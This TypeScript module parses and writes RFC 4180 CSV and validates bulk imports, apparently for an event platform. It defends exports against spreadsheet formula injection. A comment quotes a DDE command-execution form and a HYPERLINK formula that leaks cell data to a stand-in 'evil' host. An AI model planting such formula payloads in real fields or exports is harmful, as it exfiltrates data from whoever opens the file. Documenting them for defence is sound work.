/**
 * RFC 4180 CSV reading and writing (spec §38).
 *
 * Hand-written rather than pulled from a dependency because import/export is on
 * the "must not silently lose information" path: a subtly wrong CSV library is
 * how you corrupt an organizer's participant list. The rules implemented:
 *
 *  - Fields may be quoted with `"`; inside a quoted field, `""` is a literal quote.
 *  - Records may span lines inside a quoted field.
 *  - CRLF, LF and bare CR are all accepted as record separators on read, and
 *    CRLF is emitted on write (RFC 4180).
 *  - A leading BOM is stripped.
 *  - Empty trailing lines are ignored.
 *  - Row length mismatches are reported rather than silently padded, because a
 *    silently padded import is a silently corrupt import.
 */

export type CsvParseResult = {
  header: string[];
  rows: string[][];
  /** 1-based row numbers (excluding the header) with an unexpected column count. */
  raggedRows: { row: number; expected: number; actual: number }[];
};

export class CsvParseError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'CsvParseError';
  }
}

export function parseCsv(input: string, options: { maxColumns?: number } = {}): CsvParseResult {
  const maxColumns = options.maxColumns ?? 512;
  const text = input.charCodeAt(0) === 0xfeff ? input.slice(1) : input;
  const records: string[][] = [];
  let field = '';
  let record: string[] = [];
  let inQuotes = false;
  let justClosedQuote = false;
  let sawAnyChar = false;

  const endField = () => {
    record.push(field);
    field = '';
  };
  const endRecord = () => {
    endField();
    records.push(record);
    record = [];
    sawAnyChar = false;
  };

  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i] as string;
    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 1;
        } else {
          inQuotes = false;
          justClosedQuote = true;
        }
      } else {
        field += ch;
      }
      continue;
    }
    if (justClosedQuote) {
      // RFC 4180 allows only a delimiter, a record separator or EOF after a
      // closing quote. Anything else is malformed, and accepting it silently
      // would turn `"b"c` into the value `bc` — quiet data corruption on an
      // import path where the organizer has no way to notice.
      if (ch !== ',' && ch !== '\r' && ch !== '\n') {
        throw new CsvParseError(
          `Unexpected character ${JSON.stringify(ch)} after a closing quote at offset ${i}`,
        );
      }
      justClosedQuote = false;
    }
    if (ch === '"') {
      if (field !== '') throw new CsvParseError(`Unexpected quote in the middle of an unquoted field at offset ${i}`);
      inQuotes = true;
      sawAnyChar = true;
      continue;
    }
    if (ch === ',') {
      endField();
      if (record.length >= maxColumns) throw new CsvParseError(`Row exceeds the ${maxColumns}-column limit`);
      continue;
    }
    if (ch === '\r') {
      if (text[i + 1] === '\n') i += 1;
      endRecord();
      continue;
    }
    if (ch === '\n') {
      endRecord();
      continue;
    }
    field += ch;
    sawAnyChar = true;
  }

  if (inQuotes) throw new CsvParseError('Unterminated quoted field: the file ends inside a quoted value');
  if (sawAnyChar || field !== '' || record.length > 0) endRecord();

  // Drop records that are entirely empty (trailing newline artefacts).
  const cleaned = records.filter((r) => !(r.length === 1 && r[0] === ''));

  if (cleaned.length === 0) {
    return { header: [], rows: [], raggedRows: [] };
  }

  const header = (cleaned[0] as string[]).map((h) => h.trim());
  const dataRows = cleaned.slice(1);

  const raggedRows: { row: number; expected: number; actual: number }[] = [];
  dataRows.forEach((r, index) => {
    if (r.length !== header.length) raggedRows.push({ row: index + 1, expected: header.length, actual: r.length });
  });

  return { header, rows: dataRows, raggedRows };
}

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * `=`, `+`, `-` and `@` are the four Excel/Sheets/LibreOffice formula prefixes;
 * a leading tab or carriage return is the variant that survives a leading-space
 * trim in some readers, and DDE (`=cmd|'…'!A0`) is command execution on whoever
 * opens the file.
 */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

function escapeField(value: unknown): string {
  if (value === null || value === undefined) return '';
  const text = typeof value === 'string' ? value : String(value);
  /*
   * Neutralise a formula before quoting, not after.
   *
   * Quoting alone does nothing: `"=1+1"` is still a formula to Excel. The
   * leading apostrophe is the documented defence, and it is invisible in the
   * cell while making the content literal text.
   *
   * This is not theoretical. Every column of every export is user-controlled -
   * display names, bios, team and project names, descriptions, comment bodies,
   * judge summaries, webhook URLs - and any participant can set their own
   * display name. A single `=HYPERLINK("http://evil/?leak="&A1,"x")` in a
   * display name reaches the *organizer's* desktop when they open the export
   * they were told to open, which makes this organizer-to-workstation
   * injection rather than a self-inflicted one.
   */
  const safe = FORMULA_PREFIX.test(text) ? `'${text}` : text;
  if (/[",\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

export type CsvColumn<T> = {
  header: string;
  value: (row: T) => unknown;
};

/**
 * Serialise rows to CSV. Column order is explicit, so the export schema is
 * reviewable in one place and stable across releases.
 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const lines: string[] = [columns.map((c) => escapeField(c.header)).join(',')];
  for (const row of rows) {
    lines.push(columns.map((c) => escapeField(c.value(row))).join(','));
  }
  return `${lines.join('\r\n')}\r\n`;
}

/** Convert a parsed CSV into objects keyed by header, with a column index map. */
export function rowsToObjects(parsed: CsvParseResult): { objects: Record<string, string>[]; index: Map<string, number> } {
  const index = new Map<string, number>();
  parsed.header.forEach((name, i) => {
    if (!index.has(name)) index.set(name, i);
  });
  const objects = parsed.rows.map((row) => {
    const object: Record<string, string> = {};
    parsed.header.forEach((name, i) => {
      object[name] = (row[i] ?? '').trim();
    });
    return object;
  });
  return { objects, index };
}

export type ImportIssue = {
  row: number;
  column: string | null;
  message: string;
  value: string | null;
};

/**
 * A tiny declarative CSV import validator. Returns clean rows plus every issue
 * found, so a bulk import can report "12 of 340 rows rejected, here is why"
 * instead of failing wholesale or importing garbage.
 *
 * The generic is a *map* of column to value type, so each field parser is
 * inferred from the row shape it is asked to produce:
 *
 *     importRows<{ email: string; capacity: number }>(objects, {
 *       fields: {
 *         email: (raw) => validateEmail(raw),        // string
 *         capacity: (raw) => toInt(raw) ?? { error: 'not a number' },
 *       },
 *       onIssue: console.warn,
 *     })
 *
 * A parser returns either the value or `{ error }`; one bad cell rejects the
 * whole row, and the issue names the row and column so the organizer can fix
 * the file rather than guess.
 */
export function importRows<T extends Record<string, unknown>>(
  objects: readonly Record<string, string>[],
  spec: {
    fields: { [K in keyof T]: (raw: string, row: number) => T[K] | ImportError };
    onIssue: (issue: ImportIssue) => void;
  },
): { rows: { row: number; value: T }[]; issues: ImportIssue[] } {
  const issues: ImportIssue[] = [];
  const rows: { row: number; value: T }[] = [];

  objects.forEach((object, offset) => {
    const rowNumber = offset + 2; // +1 for the header row, +1 for 1-based numbering
    const record = {} as T;
    let failed = false;
    for (const column of Object.keys(spec.fields) as (keyof T & string)[]) {
      const raw = object[column] ?? '';
      const result = spec.fields[column](raw, rowNumber);
      if (isImportError(result)) {
        issues.push({ row: rowNumber, column, message: result.error, value: raw || null });
        failed = true;
      } else {
        record[column] = result as T[keyof T & string];
      }
    }
    if (!failed) rows.push({ row: rowNumber, value: record });
  });

  for (const issue of issues) spec.onIssue(issue);
  return { rows, issues };
}

export type ImportError = { error: string };

function isImportError(value: unknown): value is ImportError {
  return (
    typeof value === 'object' &&
    value !== null &&
    'error' in value &&
    typeof (value as { error: unknown }).error === 'string'
  );
}
